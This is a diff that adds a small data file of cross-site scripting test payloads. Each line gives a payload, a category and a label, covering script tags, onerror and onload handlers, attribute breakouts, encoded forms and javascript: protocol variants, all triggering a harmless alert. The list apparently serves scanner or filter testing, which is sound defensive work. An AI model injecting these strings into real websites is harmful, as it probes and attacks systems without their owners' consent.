@@ -1,0 +1,13 @@
+<script>alert("XSS")</script>|basic|Basic script alert
+<script>alert(1)</script>|basic|Basic script alert (numeric)
+<img src=x onerror=alert(1)>|event|Image onerror
+<img src="x" onerror="alert(1)">|event|Image onerror with quotes
+<svg/onload=alert(1)>|event|SVG onload
+"><script>alert(1)</script>|attribute|Close attribute script
+"><img src=x onerror=alert(1)>|attribute|Close attribute image
+" onmouseover=alert(1) |attribute|Mouseover event
+" onerror=alert(1) |attribute|Error event
+%3Cscript%3Ealert(1)%3C/script%3E|encoded|URL encoded script
+&#60;script&#62;alert(1)&#60;/script&#62;|encoded|HTML encoded script
+javascript:alert(1)|polyglot|JavaScript protocol
+jaVasCript:alert(1)|polyglot|Case-insensitive JavaScript
